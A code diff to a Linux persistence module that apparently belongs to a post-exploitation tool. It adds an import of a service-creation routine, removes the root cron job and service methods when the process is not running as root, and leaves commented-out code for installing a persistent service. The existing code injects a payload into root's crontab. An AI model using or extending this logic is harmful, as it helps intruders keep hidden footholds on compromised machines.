@@ -5,6 +5,7 @@ linux.py: Linux-specific persistence logic.
 from .base import Persistence
 from .linux_utilities.persistence_methods import LinuxPersistenceMethods
 from .linux_utilities.rootCronJob import InjectCronjob
+from .linux_utilities.sillyService import createService
 from .unix_utilities.permissions import UnixPrivilege
 
 class LinuxPersistence(Persistence):
@@ -37,6 +38,9 @@ class LinuxPersistence(Persistence):
     def supported_persistence_methods(self) -> list:
         
         methods = [method.value for method in LinuxPersistenceMethods]
+        if self.identifier != UnixPrivilege.ROOT.value:
+            methods.remove(LinuxPersistenceMethods.ROOTCRONJOB.value)
+            methods.remove(LinuxPersistenceMethods.SILLYSERVICE.value)
         
         return methods
 
@@ -47,5 +51,7 @@ class LinuxPersistence(Persistence):
         if method == LinuxPersistenceMethods.ROOTCRONJOB.value:
             InjectCronjob(self.payload).injectRoot()
             return
-
+        #elif method == LinuxPersistenceMethods.SILLYSERVICE.value:
+            #createService(self.payload).sillySit()
+            #return
         # raise NotImplementedError(f"Method {method} not implemented.") 
